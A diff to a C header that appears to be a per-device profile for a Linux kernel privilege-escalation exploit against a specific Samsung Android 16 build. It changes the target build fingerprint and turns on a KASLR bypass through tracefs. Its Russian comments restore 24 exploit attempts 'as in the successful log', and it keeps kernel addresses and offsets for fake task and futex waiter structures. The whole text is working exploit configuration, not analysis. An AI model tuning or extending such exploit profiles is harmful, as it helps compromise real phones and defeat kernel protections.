@@ -28,9 +28,30 @@
 
 #ifndef BUILD_FINGERPRINT
 #define BUILD_FINGERPRINT \
-  "samsung/r12sxxx/r12s:16/BP4A.251205.006/S721BXXSCDZF3:user/release-keys"
+  "samsung/r12sxins/r12s:16/BP4A.251205.006/S721BXXSDDZG1:user/release-keys"
 #endif
 
+// ============================================================
+// ВКЛЮЧАЕМ детерминированный обход KASLR через tracefs
+// ============================================================
+#define APP_TRACEFS_KASLR_DIRECT 1
+
+// Недостающий макрос для slide_app.c
+#define SLIDE_PSELECT_NFDS 320
+
+// ============================================================
+// ВОЗВРАЩАЕМ 24 ПОПЫТКИ (как в успешном логе)
+// ============================================================
+#undef DEFAULT_EXPLOIT_ATTEMPTS
+#undef DEFAULT_ATTEMPT_TIMEOUT_SEC
+#undef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
+#define DEFAULT_EXPLOIT_ATTEMPTS 24
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 120
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 45
+
+// ============================================================
+// Остальные параметры — из оригинального профиля
+// ============================================================
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
@@ -87,9 +108,6 @@
 #define SLIDE_SYNC_PSELECT_SYSCALL 1
 #define SLIDE_GUARD_PSELECT_SYSCALL 1
 #define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
-#define DEFAULT_EXPLOIT_ATTEMPTS 24
-#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
@@ -191,7 +209,6 @@
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
-
 
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
 #define FAKE_WAITER_TASK_OFF 0x30
